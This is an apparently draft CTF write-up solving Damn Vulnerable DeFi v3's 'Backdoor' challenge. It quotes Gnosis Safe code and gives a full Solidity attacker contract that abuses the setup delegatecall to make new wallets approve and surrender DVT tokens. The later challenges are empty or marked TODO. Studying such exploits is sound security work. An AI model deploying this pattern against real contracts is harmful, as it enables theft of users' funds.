---
title: 'Damn Vulnerable Defi V3 Solutions Part 3: 11-15'
date: 2024-01-07T13:25:00+08:00
draft: true
tags: ["ctf"]
---

## Introduction

This series of posts provides solutions for version 3 of Damn Vulnerable DeFi, which includes a total of 15 challenges.

This is the Part 3 of Damn Vulnerable Defi Solution series:
- [Part 1](../damn-vulnerable-defi-v3-solutions-part-1)
- [Part 2](../damn-vulnerable-defi-v3-solutions-part-2)
- Part 3 (Current)

You can find all my solutions and local setup in this [GitHub repository](https://github.com/pkqs90/damn-vulnerable-defi).

This post will focus on solutions for challenges 11-15. These final five challenges are the most complex in the series, encompassing highly realistic use cases, including Gnosis Safe Wallets, Uniswap V3, the UUPS Upgradeable pattern, timelocks, and more. Tackling these challenges demands extensive background knowledge about the functioning of actual contract code, and I have gained significant insights from solving them.

## Solutions

### 11. Backdoor

This is a complicated challenge that requries knowledge of the [Gnosis Safe Wallet](https://docs.safe.global/getting-started/readme). At the time solving this, my knowledge of Gnosis Safe was limited, so I didn't solve it independently. However, I found this [excellent writeup](https://www.linkedin.com/pulse/damn-vulnerable-defi-v3-backdoor-challenge-11-solution-johnny-time-bsmee/) very helpful during my attempt.

A crucial aspect of Gnosis Safe's design is its use of the Minimal proxy pattern. This means all user wallets essentially being proxies that point to a single master contract.

The challenge consists of 2 parts:
1. A `WalletRegistry` that distributes DVT tokens to registered Gnosis Safe proxy wallets with specific owners.
2. Gnosis Safe related code, which includes a `GnosisSafeProxyFactory`, `GnosisSafeProxy`, and the primary `GnosisSafe` singleton.

By reading the Gnosis Safe code, we can see that the creation of a Gnosis Safe wallet doesn't rely on `msg.sender` to determine the owner (as its main function is as a multisig wallet). Instead, it uses initializer data to set up owners, allowing anyone to create a wallet on behalf of someone else.

`GnosisSafeProxyFactory.sol` code:
```sol
    /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    function createProxyWithNonce(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce
    ) public returns (GnosisSafeProxy proxy) {
        proxy = deployProxyWithNonce(_singleton, initializer, saltNonce);
        if (initializer.length > 0)
            // solhint-disable-next-line no-inline-assembly
            assembly {
                if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                    revert(0, 0)
                }
            }
        emit ProxyCreation(proxy, _singleton);
    }

    /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (GnosisSafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }

```

`GnosisSafe.sol` code:
```sol
    /// @dev Setup function sets initial storage of contract.
    /// @param _owners List of Safe owners.
    /// @param _threshold Number of required confirmations for a Safe transaction.
    /// @param to Contract address for optional delegate call.
    /// @param data Data payload for optional delegate call.
    /// @param fallbackHandler Handler for fallback calls to this contract
    /// @param paymentToken Token that should be used for the payment (0 is ETH)
    /// @param payment Value that should be paid
    /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
        // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
        setupOwners(_owners, _threshold);
        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
        // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
        setupModules(to, data);

        if (payment > 0) {
            // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
            // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
            handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
        }
        emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    }
```

It's important to note that within the `setupModules` function, there's a `delegatecall` made to an externally specified address by the user. This feature is intended for setting up the modules used by the wallet. However, it is also out entry point of exploitation.

`ModuleManager.sol` code:
```sol
    function setupModules(address to, bytes memory data) internal {
        require(modules[SENTINEL_MODULES] == address(0), "GS100");
        modules[SENTINEL_MODULES] = SENTINEL_MODULES;
        if (to != address(0))
            // Setup has to complete successfully or transaction fails.
            require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
    }
```

Up until this point, the process of creating a proxy wallet is clear.

```
User
  |
  | (call)
  v
GnosisSafeProxyFactory
  |
  | (call)
  v
GnosisSafeProxy
  |
  | (delegatecall)
  v
GnosisSafe
  |
  | (delegatecall)
  v
External Code
```

We know that when a Gnosis Safe proxy wallet is created, the `WalletRegistry` sends DVT tokens to it. Therefore, our solution would be making the proxy approve us the DVT tokens during the execution of the external code at its creation. The final exploit code would be:

```sol
contract WalletRegistryAttacker {

    address singleton;
    GnosisSafeProxyFactory proxyFactory;
    WalletRegistry registry;
    // The `immutable` here is crucial, without it the delegatecall call would end up calling with caller's
    // storage data, which would fail.
    DamnValuableToken immutable token;

    constructor(address addr1, address addr2, address addr3, address addr4) {
        singleton = addr1;
        proxyFactory = GnosisSafeProxyFactory(addr2);
        registry = WalletRegistry(addr3);
        token = DamnValuableToken(addr4);
    }

    function approve(address addr) public {
        token.approve(addr, 10 ether);
    }

    function attack(address[] memory beneficiaries) public payable {
        for (uint256 i = 0; i < 4; ++i) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = beneficiaries[i];

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                singleton,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector, // Selector for the setup() function call
                    beneficiary, // _owners =>  List of Safe owners.
                    1, // _threshold =>  Number of required confirmations for a Safe transaction.
                    address(this), //  to => Contract address for optional delegate call.
                    abi.encodeWithSignature("approve(address)", address(this)), // data =>  Data payload for optional delegate call.
                    address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                    0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                    0, // payment => Value that should be paid
                    0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
                ),
                0, // salt
                IProxyCreationCallback(registry)
            );
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}

```

### 12. Climber

TODO.

### 13. Wallet Mining

### 14. Puppet V3

### 15. ABI Smuggling